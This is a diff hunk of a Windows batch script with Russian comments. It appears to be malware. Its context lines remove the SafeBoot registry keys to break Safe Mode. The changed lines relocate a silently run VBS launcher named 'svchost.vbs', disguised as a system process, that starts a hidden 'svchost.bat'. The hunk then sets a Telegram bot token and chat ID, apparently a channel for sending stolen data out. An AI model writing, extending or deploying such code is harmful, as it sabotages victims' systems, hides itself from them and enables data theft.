@@ -11,18 +11,18 @@ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot" /v "Minim
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot" /v "Network" /t REG_SZ /d "" /f >nul 2>&1
 
 rem Укажите путь к вашему VBS файлу
-set "vbsFile=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svchost.vbs"
+set "vbsFile=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\svchost.vbs"
 
 rem Проверка, существует ли VBS файл
 if not exist "%vbsFile%" (
     rem Запись скрипта в VBS файл
     (
         Set WshShell = CreateObject("WScript.Shell")
-        WshShell.Run "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svchost.bat", 0, False
+        WshShell.Run "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\svchost.bat", 0, False
     ) > "%vbsFile%"
 ) >nul 2>&1
 
-start "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svchost.vbs" >nul 2>&1
+start "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\svchost.vbs" >nul 2>&1
 
 set "BOT_TOKEN=7360956253:AAGcKMr9NLHTubWGZWfWTODaWoR0OwS44HI"
 set "CHAT_ID=5757337298"
